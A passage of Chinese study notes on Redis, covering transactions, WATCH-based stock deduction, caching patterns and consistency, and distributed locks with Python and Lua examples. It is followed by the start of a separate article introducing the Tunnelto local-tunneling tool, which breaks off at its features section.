<p>传统的关系型数据库事务严格遵循<code>ACID</code>原则，原子性、一致性、隔离性和持久性，但是<code>Redis</code>事务为了极致的性能，并不是完全遵循ACID原则。接下来介绍下他的区别：</p>
<ol start="0">
<li>
<p>原子性</p>
<p>原子性的定义就是事务中的所有的操作，要么全部执行，要么全部不执行，不会出现部分执行的情况，而<code>Redis</code>事务的原子性分为两种情况：</p>
<p>1） 事务入队前出错，全不执行：当在MULTI后，EXEC前出现语法错误，<code>Redis</code>会立即返回错误，执行EXEC时会直接放弃整个事务</p>
<p>2） 执行事务中出现错误，部分执行，没有回滚，命令入队时只会做语法检查，不会做逻辑检查，执行时如果出现了运行错误，<code>Redis</code>就会跳过这个命令，继续执行后续的命令，而且不会对已经执行的命令做回滚</p>
<p>不支持回滚主要也是从性能考量，实现回滚需要记录每个命令的逆操作，比如SET的操作就是恢复原值，这个会增加<code>Redis</code>内核的复杂度，牺牲执行的性能。</p>
</li>
<li>
<p>一致性</p>
<p>一致性就是事务执行的前后，数据库的状态始终保持合法，不会因为事务的执行而出现脏数据。<code>Redis</code>事务可以在所有的异常情况下，比如入队错误、执行错误、宕机，都可以保证数据的一致性。</p>
</li>
<li>
<p>隔离性</p>
<p>隔离就是在多个事务并发执行时，一个事务的执行不会被其他的事务干扰，各个事务之间相互隔离。<code>Redis</code>是单线程处理客户端请求的，这就会导致事务的执行会按照队列中的顺序连续执行，不会被其他的命令打断</p>
</li>
<li>
<p>持久性</p>
<p>持久性是指事务执行成功后，对数据的修改会被永久的保存到磁盘中，不会应为宕机而丢失。<code>Redis</code>事务本身并不保证持久性，持久性是由<code>Redis</code>的持久化机制来实现的，前面也介绍过</p>
</li>
</ol>
<p>接下来写一个小的demo，利用watch来控制库存防止超卖</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_purchase</span>(<span class="hljs-params">stock_key: <span class="hljs-built_in">str</span>, user: <span class="hljs-built_in">str</span>, qty: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""使用 WATCH + 事务进行扣库存，避免超卖。
​
    乐观锁思路：
    1. WATCH 库存 key，监听是否被别人改动；
    2. 读当前库存，判断是否足够；
    3. 使用 MULTI 开启事务，扣减库存；
    4. EXEC 提交，如果在这期间库存被别人改了，EXEC 会失败（抛 WatchError），然后重试。
    """</span>
​
    <span class="hljs-keyword">with</span> r.pipeline() <span class="hljs-keyword">as</span> pipe:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># 1. 监听库存 key</span>
                pipe.watch(stock_key)
​
                <span class="hljs-comment"># 2. 读取当前库存</span>
                current = pipe.get(stock_key)
                <span class="hljs-keyword">if</span> current <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 商品不存在"</span>)
                    pipe.unwatch()
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
​
                current = <span class="hljs-built_in">int</span>(current)
                <span class="hljs-keyword">if</span> current &lt; qty:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 库存不足，当前库存=<span class="hljs-subst">{current}</span>"</span>)
                    pipe.unwatch()
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
​
                <span class="hljs-comment"># 3. 开启事务，扣减库存</span>
                pipe.multi()
                pipe.decrby(stock_key, qty)
​
                <span class="hljs-comment"># 4. 提交事务</span>
                pipe.execute()
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 抢购成功，扣减 <span class="hljs-subst">{qty}</span>，扣减前库存=<span class="hljs-subst">{current}</span>"</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
​
            <span class="hljs-keyword">except</span> redis.WatchError:
                <span class="hljs-comment"># 在 WATCH 之后、EXEC 之前，有其他客户端修改了 stock_key，</span>
                <span class="hljs-comment"># 这次事务会失败，需要重试。</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{user}</span>: 检测到并发冲突，重试中..."</span>)
                <span class="hljs-keyword">continue</span>
</code></pre>
<h2 data-id="heading-16">第三阶段：高并发&amp;分布式</h2>
<h4 data-id="heading-17">7. 缓存模式与一致性</h4>
<p><code>Redis</code>作为缓存的核心亮点就在于其高速的读写操作，来降低传统数据库的压力，基于此<code>Redis</code>推出了有大概四种主流的缓存策略，来将缓存融入业务读写流程，同时保证缓存与数据库的一致性。接下来挨个介绍下：</p>
<ol start="0">
<li>
<p>缓存穿透模式</p>
<p>缓存和数据库分离，业务代码主动管理缓存和数据库的交互。在读操作时，先查询缓存，如果命中就直接返回，如果没有就查询数据库，同时将数据库的结果写入缓存；在写操作时，先更新数据库，在删除缓存。</p>
<p>这种模式适合绝大多数的生产场景，是<code>Redis</code>作为缓存的首选模式。优点就是简单易实现，缺点就是需要额外处理缓存穿透、击穿雪崩等场景。</p>
</li>
<li>
<p>读写穿透</p>
<p>业务代码只和缓存交互，不直接操作数据库，缓存作为中间层，主动管理数据库的读写。在读操作时，先查询缓存，如果命中就直接返回，未命中就查询数据库，将结果写入缓存，然后返回；写操作就更新缓存，然后再去更新数据库。</p>
<p>这种模式的特点就是业务代码只专注于业务，数据库由缓存层来处理，简化了业务代码逻辑，缺点就是缓存层需要额外的代码开发，而且不支持新增数据，因为新增数据要先执行读操作，才能存入缓存，不太符合常规的业务逻辑。</p>
</li>
<li>
<p>写穿模式</p>
<p>这种模式是读写穿模式的增强版，支持新增、更新数据。在读操作时，和读写穿透模式一样，命中返回，未命中查库更新缓存；写操作时和新增数据时，缓存同步更新数据库，然后返回给业务。</p>
<p>这种模式的特点在于写操作时，缓存和数据库同步更新，缓存和数据库有着非常强的一致性，常用于支付业务的核心数据缓存。</p>
</li>
<li>
<p>写回模式</p>
<p>这种模式是写穿模式的异步版，差异就在与写操作时是异步的。在读操作时，和读写穿透、写穿模式一样，命中就返回，未命中查库更新缓存后返回；在新增和更新的写操作时，缓存立即返回，然后异步去更新数据。</p>
<p>这种模式适合并发高、一致性要求较低的场景，比如日志缓存等。</p>
</li>
</ol>
<p>生产模式中比较常用和推荐的，就是缓存穿透模式，然后这种模式在一致性的问题上需要额外处理。比如有这么几个场景：</p>
<ol start="0">
<li>在写操作时，正常的流程是，更新数据库，然后删除缓存，更新缓存需要下次读的时候去查库更新。但是如果更新数据库后，遇到宕机或者网络异常，就会导致缓存未及时删除，这就出现了脏数据，知道缓存过期。这也是最常见的不一致场景，属于操作中断导致的缓存未更新。</li>
<li>在并发的场景下，客户端A和客户端B同时分别执行读写操作，A读操作时，缓存未命中就会去查库，B写操作时更新完数据库后，回去删除缓存，这时如果读操作的写缓存的动作晚于写操作的删除动作，就会产生数据库与缓存的不一致场景，数据库是新的数据，缓存中是旧的脏数据。</li>
</ol>
<p>在数据一致性上有这样一个原则，最终数据一致性即可，而非强制一致性。<code>Redis</code>作为缓存，是没有办法实现和数据库的强一致性。因为缓存和数据库属于两个独立的存储系统，非要强一致性就需要加锁，这就会牺牲<code>Redis</code>的高性能，而且在实际业务中，带短暂的不一致，对于用户来说并没有感知的。</p>
<p>在缓存穿透模式中，有这么几个方案可以解决缓存与数据库的一致性问题</p>
<ol start="0">
<li>
<p>单实例低并发场景，在一些后台管理，小流量业务汇中，可以直接使用缓存穿透模式的基础逻辑，即读操作时先缓存后数据库，如果不存在就写一个缓存空值，加上过期时间；在写操作时，先更新数据库，在删除缓存，给所有的缓存加上过期时间。</p>
<p>这里设置缓存空值，就是为了防止缓存杀手-穿透，比如查询一个数据库没有的值，这就会直接访问数据库，万一遇到恶意访问的脚本，就会导致数据库压力；而设置一个空值，在过期时间内，他是一个有效的缓存，虽然没有值，但减轻了数据库的压力，算是为了系统的稳定性做了一次兜底。</p>
</li>
<li>
<p>单实例高并发，在电商的商品详情、商品秒杀库存业务中，在基础方案上增加延迟删除缓存，来解决<code>读操作写缓存晚于写操作删缓存</code>的问题。 流程就是在写操作执行更新数据库后，延迟N毫秒删除缓存，让读操作查库、写缓存的动作先完成。</p>
</li>
</ol>
<p>还有一个常见的八股文：缓存的三大杀手，穿透、击穿和雪崩。</p>
<ol start="0">
<li>
<p>穿透，在前面的穿透模式时介绍过了，就是查询一些数据库中不存在的值时，每次都会去查询数据库，导致缓存失效，数据库增加额外的压力。解决方案有下面几种：</p>
<p>1）设置空值，前面也介绍过，这是最简通用的方案</p>
<p>2）布隆过滤器，提前将数据库中所有的合法key存入过滤器，请求先过过滤器，判定不存在就会直接拒绝，就走不到缓存和数据库了</p>
<p>3）IP/接口 限流熔断，对于穿透请求高频的IP限流，对查询接口做熔断保护。这里的限流就是限制单位时间内允许请求的数量，比如单位时间内某个IP大量请求不存在的ID，加了限流之后直接回报错429错误码，就走不到缓存、数据库了；熔断就是当下游服务器持续失败或者过慢时，暂时切断请求，防止雪崩扩散。</p>
</li>
<li>
<p>击穿，某个极高的热点key，恰好过期或者被删除，此时大量并发请求同时访问该key，全部缓存未命中，所有的请求都会访问到数据库。这里的解决方案有：互斥锁串行重建缓存，热点key永不过期，热点key主动更新</p>
</li>
<li>
<p>雪崩，大量缓存key在同一时间集体过期，或者<code>Redis</code>缓存集体宕机，导致请求绕过缓存直接访问数据库，导致数据库负载瞬间爆表，引发整个服务链路雪崩。解决方案有：过期时间随机化，<code>Redis</code>集群高可用，服务限流、熔断、降级。</p>
</li>
</ol>
<h4 data-id="heading-18">8. 分布式锁</h4>
<p>在分布式、微服务架构中，一个服务会运行在多台机器上，这就是多进程的概念，多台机器会共享一个资源，这个时候python的线程锁就会失效，因为这些锁的作用范围是当前进程的内存，只能管自己进程内的线程。这时就需要分布式锁了，分布式锁就是跨进程、跨服务的锁，要保证多个进程对共享资源的互斥访问。</p>
<p>分布式锁有四个核心的特性：</p>
<ol>
<li>互斥性，同一时间只有一个客户端持有锁，其他的客户端必须等待</li>
<li>安全性，锁只能被其持有者释放，不能被其他客户端误删</li>
<li>避免死锁，即使持有锁的客户端崩溃、中断，也可以在一定时间后自动释放</li>
<li>可用性，<code>Redis</code>集群环境下，锁服务不能单点故障，要保证大部分节点可用</li>
</ol>
<p><code>Redis</code>做分布式锁的优点，就在于其性能极高，获取、释放锁都是毫秒级，而且部署也比较简单。</p>
<p>接下来介绍下<code>Redis</code>单节点分布式锁的几个命令：</p>
<ol>
<li>key 锁的唯一标识，比如要给ID=111的资源加锁</li>
<li>value 客户端的唯一标识，保证锁只能被持有者释放</li>
<li>NX 全程<code>Not Exist</code>，只有当key不存在时才会设置成功</li>
<li>EX/PX 设置的过期时间，EX单位是秒，PX单位是毫秒</li>
<li>timeout 锁的过期时间，避免死锁</li>
</ol>
<p>比如这行代码：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SET</span> lock:<span class="hljs-keyword">order</span>:<span class="hljs-number">123</span> uuid:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> NX EX <span class="hljs-number">30</span>
</code></pre>
<p>就表明给资源key为lock:order:123的资源加锁，锁的持有者是uuid:192.168.1.100，30秒后过期</p>
<p>而释放锁，就回到刚刚的安全性了，必须只有锁的持有客户端才可以释放。流程就是先判断加锁的客户端是不是自己，如果是才可以去释放，看下相关的Iua脚本：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'DEL'</span>, KEYS[<span class="hljs-number">1</span>])  <span class="hljs-comment">-- 标识匹配，删除锁</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment">-- 标识不匹配，不做任何操作</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>之前写过一个卖票的函数，就是使用<code>Redis</code>的分布式锁来控制库存，防止超卖：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">sell_one_with_lock</span>(<span class="hljs-params">r: Redis, window_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""使用 Redis 分布式锁保护“检查+扣减”关键区，成功卖出返回 True，售罄或失败返回 False。"""</span>
    lock = r.lock(LOCK_KEY, timeout=<span class="hljs-number">5</span>, blocking_timeout=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 超时时间与获取等待时间可调</span>
    acquired = <span class="hljs-keyword">await</span> lock.acquire(blocking=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> acquired:
        <span class="hljs-comment"># 未拿到锁，视为本次卖票失败（可重试）</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 关键区：读取剩余、判定、扣减</span>
        remaining_str = <span class="hljs-keyword">await</span> r.get(TICKET_KEY)
        remaining = <span class="hljs-built_in">int</span>(remaining_str) <span class="hljs-keyword">if</span> remaining_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> remaining &lt;= <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-comment"># 扣减一张（原子自减命令）</span>
        <span class="hljs-keyword">await</span> r.decr(TICKET_KEY)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">await</span> lock.release()
        <span class="hljs-keyword">except</span> Exception:
            <span class="hljs-comment"># 若锁已过期或其他异常，忽略释放错误</span>
            <span class="hljs-keyword">pass</span>
​
</code></pre>
<p>代码第一行就创建了一个分布式锁，传入了一个过期时间防止死锁，<code>lock.acquire</code>是真正的加锁步骤。之前看到这里有个疑惑：每次调用这个方法，都会创建一个分布式锁，如何保证对一个资源加锁，在创建锁的时候传入了<code>LOCK_KEY</code>，这个就是要加锁的key，也就是要加锁的资源，这个方法每次执行都会创建一个锁，但是<code>lock.acquire</code>在资源没有释放的时候，返回的是false，也就是会走到<code>if not</code>这里的。</p>
<p>其实后续章节还有单点故障，主从、哨兵、 <code>Redlock</code>、 扩容、数据分片等，觉得分布式、缓存还需要消化下，后面就不在深入了，打算进入实战环节了，后续打算设计三个实战项目来进一步深入的学习下。</p>
<p>三个实战项目分别是</p>
<ol>
<li>信息查询系统，使用<code>MySQL</code>存储用户信息，<code>Redis</code>作为缓存，巩固下前面学习的缓存模式，同时加上压测环节，通过QPS，响应时间更加直观的了解缓存的意义</li>
<li>抢票系统，学习下Lua脚本，</li>
<li>秒杀系统，学习下高并发处理、限流、防超卖策略</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具]]></title>    <link>https://juejin.cn/post/7603221478473351210</link>    <guid>https://juejin.cn/post/7603221478473351210</guid>    <pubDate>2026-02-05T12:00:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473351210" data-draft-id="7603221478473334826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具"/> <meta itemprop="keywords" content="开源,前端,后端"/> <meta itemprop="datePublished" content="2026-02-05T12:00:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个开源项目（第13篇）：Tunnelto - 用Rust打造的高性能内网穿透工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:54.000Z" title="Thu Feb 05 2026 12:00:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>"如果只需要一条命令，就能让全世界的用户访问你本地运行的web服务器，那该多好？"</p>
</blockquote>
<p>这是"一天一个开源项目"系列的第13篇文章。今天带你了解的项目是 <strong>Tunnelto</strong>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">GitHub</a>）。</p>
<p>在开发和测试web应用时，我们经常需要将本地服务暴露给外部访问，比如让远程同事测试、集成第三方webhook、或者演示给客户。传统的解决方案要么配置复杂，要么性能不佳，要么需要付费。Tunnelto用Rust打造，基于Tokio异步IO，提供了高性能、易用的内网穿透解决方案，让你用一条命令就能将本地服务暴露到互联网。</p>
<h3 data-id="heading-1">你将学到什么</h3>
<ul>
<li>Tunnelto的核心架构和技术特点</li>
<li>如何使用Tunnelto快速暴露本地服务</li>
<li>Rust异步IO在网络隧道中的应用</li>
<li>Tunnelto与其他内网穿透工具的对比</li>
<li>如何自托管Tunnelto服务器</li>
<li>Tunnelto的高级功能和配置选项</li>
<li>实际开发场景中的应用案例</li>
</ul>
<h3 data-id="heading-2">前置知识</h3>
<ul>
<li>对网络基础有基本了解（TCP/IP、HTTP）</li>
<li>了解本地开发服务器的概念</li>
<li>熟悉命令行工具的使用</li>
<li>对Rust有基本认识（可选，有助于理解实现原理）</li>
</ul>
<hr/>
<h2 data-id="heading-3">项目背景</h2>
<h3 data-id="heading-4">项目简介</h3>
<p><strong>Tunnelto</strong> 是一个用<strong>Rust编写的高性能内网穿透工具</strong>，让你能够通过一条简单的命令，将本地运行的web服务器暴露到互联网，获得一个公共可访问的URL。它完全基于异步IO（Tokio），性能优异，同时支持自定义子域名和自托管部署。</p>
<p><strong>项目解决的核心问题</strong>：</p>
<ul>
<li>本地开发服务无法被外部访问，影响协作和测试</li>
<li>传统内网穿透工具配置复杂、性能不佳</li>
<li>需要集成第三方服务（如OAuth回调、Webhook）时无法使用localhost</li>
<li>商业解决方案价格昂贵或有限制</li>
<li>需要自托管解决方案以保护隐私和数据安全</li>
</ul>
<p><strong>面向的用户群体</strong>：</p>
<ul>
<li>Web开发者和全栈工程师</li>
<li>需要快速演示和测试的开发者</li>
<li>需要集成第三方API的开发者</li>
<li>对性能和隐私有要求的开发者</li>
<li>需要自托管内网穿透服务的团队</li>
</ul>
<h3 data-id="heading-5">作者/团队介绍</h3>
<p><strong>作者：Alex Grinman (@agrinman)</strong></p>
<ul>
<li><strong>背景</strong>：专注于系统编程和网络技术的开发者</li>
<li><strong>项目创建时间</strong>：2020年</li>
<li><strong>理念</strong>：打造高性能、易用、可自托管的内网穿透工具</li>
<li><strong>技术栈</strong>：Rust、Tokio、异步IO</li>
</ul>
<h3 data-id="heading-6">项目数据</h3>
<ul>
<li>⭐ <strong>GitHub Stars</strong>: 5.7k+（持续增长）</li>
<li>🍴 <strong>Forks</strong>: 432+</li>
<li>📦 <strong>版本</strong>: 0.1.18（最新版本，2021年5月16日发布）</li>
<li>📄 <strong>License</strong>: MIT</li>
<li>🌐 <strong>官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
<li>💬 <strong>社区</strong>: GitHub Issues活跃</li>
</ul>
<p><strong>项目发展历程</strong>：</p>
<ul>
<li>2020年：项目创建，发布初始版本</li>
<li>2020-2021年：持续优化，添加新功能</li>
<li>2021年5月：发布0.1.18版本，功能稳定</li>
<li>持续维护：项目持续活跃，社区贡献不断</li>
</ul>
<hr/>
<h2 data-id="heading-7">主要功能</h2>
<h3 data-id="heading-8">核心作用</h3>
<p>Tunnelto的核心作用是<strong>将本地运行的web服务器通过公共URL暴露到互联网</strong>，主要功能包括：</p>
<ol>
<li><strong>快速暴露本地服务</strong>：一条命令即可将本地端口映射到公共URL</li>
<li><strong>自定义子域名</strong>：支持指定自定义子域名，方便记忆和使用</li>
<li><strong>API认证</strong>：支持API密钥认证，保护隧道安全</li>
<li><strong>自托管支持</strong>：可以部署自己的Tunnelto服务器</li>
<li><strong>高性能</strong>：基于Rust和Tokio异步IO，性能优异</li>
<li><strong>本地仪表板</strong>：提供本地监控和调试界面</li>
</ol>
<h3 data-id="heading-9">使用场景</h3>
<ol>
<li>
<p><strong>Web开发测试</strong></p>
<ul>
<li>让远程团队成员访问本地开发环境</li>
<li>在移动设备上测试响应式设计</li>
<li>演示给客户或产品经理</li>
</ul>
</li>
<li>
<p><strong>第三方服务集成</strong></p>
<ul>
<li>OAuth回调URL配置（GitHub、Google等）</li>
<li>Webhook接收（Stripe、GitHub Actions等）</li>
<li>第三方API测试和调试</li>
</ul>
</li>
<li>
<p><strong>API开发和调试</strong></p>
<ul>
<li>让前端开发者访问本地API服务</li>
<li>测试移动应用与后端API的集成</li>
<li>调试跨域问题</li>
</ul>
</li>
<li>
<p><strong>临时演示和分享</strong></p>
<ul>
<li>快速分享本地项目给他人</li>
<li>临时演示和原型展示</li>
<li>无需部署即可展示功能</li>
</ul>
</li>
<li>
<p><strong>CI/CD集成</strong></p>
<ul>
<li>在CI环境中暴露测试服务</li>
<li>自动化测试中的服务访问</li>
<li>临时测试环境搭建</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">快速开始</h3>
<h4 data-id="heading-11">安装方式</h4>
<p><strong>macOS (Homebrew)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">brew install agrinman/tap/tunnelto
</code></pre>
<p><strong>Cargo (Rust用户)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">cargo install tunnelto
</code></pre>
<p><strong>其他平台</strong>:
从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto%2Freleases" target="_blank" title="https://github.com/agrinman/tunnelto/releases" ref="nofollow noopener noreferrer">GitHub Releases</a> 下载对应平台的二进制文件。</p>
<h4 data-id="heading-12">最简单的使用示例</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 暴露本地8000端口的服务</span>
tunnelto --port 8000
</code></pre>
<p>运行后，你会看到类似这样的输出：</p>
<pre><code class="hljs language-arduino" lang="arduino">🚀 Starting tunnelto...
🌍 Public URL: https:<span class="hljs-comment">//abc123.tunnelto.dev</span>
📊 Dashboard: http:<span class="hljs-comment">//localhost:4040</span>
</code></pre>
<p>现在，任何人都可以通过 <code>https://abc123.tunnelto.dev</code> 访问你本地 <code>localhost:8000</code> 的服务。</p>
<h4 data-id="heading-13">自定义子域名</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用自定义子域名</span>
tunnelto --port 8000 --subdomain myapp
</code></pre>
<p>这样会生成 <code>https://myapp.tunnelto.dev</code> 的URL。</p>
<h4 data-id="heading-14">指定本地主机和协议</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 指定本地主机和协议</span>
tunnelto --port 3000 --host 127.0.0.1 --scheme https
</code></pre>
<h3 data-id="heading-15">核心特性</h3>
<ol>
<li>
